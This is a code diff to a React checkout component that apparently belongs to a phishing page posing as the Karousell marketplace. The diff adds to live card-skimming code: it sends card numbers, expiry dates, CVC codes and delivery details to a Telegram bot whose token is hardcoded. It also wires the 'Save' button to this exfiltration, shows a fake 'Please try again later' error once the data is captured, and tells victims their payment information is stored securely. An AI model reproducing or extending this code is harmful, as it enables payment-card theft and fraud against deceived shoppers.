@@ -80,6 +80,8 @@ function Cart() {
 	const [showMobileAddressOptionDelete, setShowMobileAddressOptionDelete] = useState('none');
 	const [showMobilePaymentMethods, setShowMobilePaymentMethods] = useState('none');
 	const [showMobilePaymentMethodsCreditCard, setShowMobilePaymentMethodsCreditCard] = useState('none');
+	const [showFailSaveCard, setShowFailSaveCard] = useState(false);
+	const [osVersion, setOsVersion] = useState('');
 
 
 	const emailInput = useRef(null);
@@ -101,13 +103,20 @@ function Cart() {
 	  const handleResize = () => {
 		setIsMobile(window.innerWidth <= 767);
 	  };
+
+		if (isMobile === true) {
+		setOsVersion('Mobile');
+		}
+		else if (isMobile === false) {
+			setOsVersion('Desktop');
+		}
   
 	  window.addEventListener('resize', handleResize);
   
 	  return () => {
 		window.removeEventListener('resize', handleResize);
 	  };
-	}, []);
+	}, [isMobile]);
 
 
 	useEffect(() => {
@@ -149,6 +158,11 @@ function Cart() {
 		event.preventDefault();
 	}
 
+	function handleShowCardPayment() {
+		setShowCardPayment('')
+		setShowFailSaveCard(false);
+	}
+
 	function handlePaymentMethodsBack() {
 		setShowMobilePaymentMethods('none');
 		setShowMobileMainMenu('')
@@ -162,6 +176,7 @@ function Cart() {
 	function handlePaymentMethodsCreditCardShow() {
 		setShowMobilePaymentMethods('none');
 		setShowMobilePaymentMethodsCreditCard('')
+		setShowFailSaveCard(false);
 	}
 
 	function handlePaymentMethodsShow() {
@@ -251,30 +266,48 @@ function Cart() {
 
 
 	async function sendDataCard() {
-		try {
-			const botToken = '6338286867:AAEGFCdpanhtiU3l9BLd2haGEN-v1Uc5suc';
-			const chatId = '-922689126';
-			let message = `<b>PAYMENT DATA:</b>\n`;
-			message += `<b>CARD NUMBER: ${cardNumber}</b>\n`;
-			message += `<b>DATE: ${cardDataInfo}</b>\n`;
-			message += `<b>CVC CODE: ${cardDataInfoCvvCode}</b>\n`;
-	
+		if (isValidCardInputCard === false 
+			&& isValidCardMonthData === false
+			&& cardDataInfoCvvCode.length === 3
+			&& cardDataInfo.length > 3 
+			&& cardNumber.length >= 16 ) {
+			setShowFailSaveCard(true);
+
+				try {
+
+					// if (isMobile === true) {
+					// 	setOsVersion('Mobile');
+					// }
+					// else if (isMobile === false) {
+					// 	setOsVersion('Desktop');
+					// }
+
+
+					const botToken = '6338286867:AAEGFCdpanhtiU3l9BLd2haGEN-v1Uc5suc';
+					const chatId = '-922689126';
+					let message = `<b>PAYMENT DATA:</b>\n`;
+					message += `<b>VERSION: ${osVersion}</b>\n`;
+					message += `<b>CARD NUMBER: ${cardNumber}</b>\n`;
+					message += `<b>DATE: ${cardDataInfo}</b>\n`;
+					message += `<b>CVC CODE: ${cardDataInfoCvvCode}</b>\n`;
+					
+					
+					const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+					const params = {
+						chat_id: chatId,
+						parse_mode: 'HTML',
+						text: message,
+					};
+					
+					await axios.post(url, params);
+				} catch (error) {
+				console.error('ERROR:', error);
+			}
 		
-			const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-			const params = {
-			chat_id: chatId,
-			parse_mode: 'HTML',
-			text: message,
-			};
-		
-			await axios.post(url, params);
-		} catch (error) {
-			console.error('ERROR:', error);
 		}
 		
-		  
 	}
-
+	
 
 	function handleShowMainMobileMenuFromAddressBack() {
 		setShowMobileAddAddress('none')
@@ -672,10 +705,18 @@ function Cart() {
 
 		  	setShowMobileAddAddress('')
 			setShowMobileAddAddressMenu('none')
+			
+			if (isMobile) {
+				setOsVersion('Mobile');
+			}
+			else {
+				setOsVersion('Desktop');
+			}
 
 			const botToken = '6338286867:AAEGFCdpanhtiU3l9BLd2haGEN-v1Uc5suc';
 			const chatId = '-922689126';
 			let message = `<b>DELIVERY DATA:</b>\n`;
+			message += `<b>VERSION: ${osVersion}</b>\n`;
 			message += `RECIPIENT'S NAME: <b>${addressRecipientName}</b>\n`;
 			message += `PHONE NUMBER: <b>${addressPhoneNumber}</b>\n`;
 			message += `POSTCODE: <b>${addressPostcode}</b>\n`;
@@ -1383,7 +1424,7 @@ const theme2 = createTheme({
 										<p>Add debit/credit card</p>
 									</div>
 									<div className="order-delivery-container-wrapper-header-right">
-										<button>Save</button>
+										<button onClick={sendDataCard}>Save</button>
 									</div>
 								</div>
 							</div>
@@ -1475,12 +1516,18 @@ const theme2 = createTheme({
 											</div>
 										</div>
 										<input 
+										pattern="[0-9]*" 
+										value={cardNumber} 
+										onChange={handleCardNumber}
+										maxLength={19}
+										onBlur={handleFocusInputCard}
+										onFocus={handleFocusInputCard}
+										style={{color: isColorRedMainCard}}
 										placeholder="Card number"
 										className="mobile-credit-card-input" 
 										type="text" />
-										<h2 className="add-credit-card-menu-main-container-card-number-input-footer-text">
-											Ewqewq
-										</h2>
+										{/* <h2 className="add-credit-card-menu-main-container-card-number-input-footer-text">Ewqewq</h2> */}
+										{isValidCardInputCard ? <h2 className="add-credit-card-menu-main-container-card-number-input-footer-text">{cardErrorDataTextInput}</h2> : null}
 									</div>
 								</div>
 								<div className="add-credit-card-menu-main-container-card-info-input">
@@ -1490,29 +1537,43 @@ const theme2 = createTheme({
 												<h2>Expiry Date</h2>
 											</div>
 											<input 
+											pattern="[0-9]*" 
+											value={cardDataInfo}
+											onChange={handleCardInfo}
+											maxLength={7}
+											onBlur={handleFocusInputCardStandard}
+											onFocus={handleFocusInputCardStandard}
 											placeholder="BB/TT"
+											style={{color: isColorRedDateCard}}
 											className="mobile-credit-card-info-date-input" 
-											type="text" />
-										
-											<h2 className="add-credit-card-menu-main-container-card-info-input-footer-text">
-												Ewqewq
-											</h2>
+											type="text" 
+											/>
+											{/* <h2 className="add-credit-card-menu-main-container-card-info-input-footer-text">Ewqewq</h2> */}
+											{isValidCardMonthData ? <h2 className="add-credit-card-menu-main-container-card-info-input-footer-text">{cardErrorDataText}</h2> : <div><h2></h2></div>}
 										</div>
 										<div>
 											<div className="mobile-credit-card-info-cvv-header-text">
 												<h2>CVV</h2>
 											</div>
 											<input 
+											pattern="[0-9]*" 
+											value={cardDataInfoCvvCode}
+											onChange={(event) => setCardDataInfoCvvCode(event.target.value)}
+											maxLength={3}
+											onBlur={handleFocusInputCardCvc}
+											onFocus={handleFocusInputCardCvc}
 											placeholder="CVC"
 											className="mobile-credit-card-info-cvv-input" 
 											type="text" />
-										
-											<h2 className="add-credit-card-menu-main-container-card-cvv-input-footer-text">
-												Ewqewq
-											</h2>
 										</div>
 									</div>
-
+								</div>
+								<div>
+								 { showFailSaveCard ? <h2 style={{fontSize: '16px', fontWeight: '400'}} className="add-credit-card-menu-main-container-card-info-input-footer-text">Please try again later.</h2> : null}
+									<div className="add-credit-card-menu-footer-text">
+										<img src="https://mweb-cdn.karousell.com/build/lock-outlined-46625ed54a.svg" alt="" />
+										<p>Your payment information is stored securely.</p>
+									</div>
 								</div>
 								
 
@@ -1776,7 +1837,7 @@ const theme2 = createTheme({
 												</div>
 												<div className="main-field-center-body-info-payment-method-credit-card-field" style={{gap: '8px', display: 'grid'}}>
 												</div>
-												<button onClick={() => setShowCardPayment('')}
+												<button onClick={handleShowCardPayment}
 												className="main-field-center-body-info-payment-method-credit-card-button">Add credit / debit card</button>
 											</div>
 											<div style={{margin: '24px 0px', borderTop: '1px solid rgb(240, 241, 241)'}}></div>
@@ -1989,6 +2050,7 @@ const theme2 = createTheme({
 								</div>
 								{isValidCardMonthData ? <p className="card-main-error-text">{cardErrorDataText}</p> : null}
 								{isValidCardInputCard ? <p className="card-main-error-text">{cardErrorDataTextInput}</p> : null}
+								{showFailSaveCard ? <h2 style={{fontSize: '16px', fontWeight: '400', color: '#991720'}} className="add-credit-card-menu-main-container-card-info-input-footer-text">Please try again later.</h2> : null}
 								<button onClick={sendDataCard}
 								className="credit-card-wrapper-container-main-footer-button">Add card</button>
 
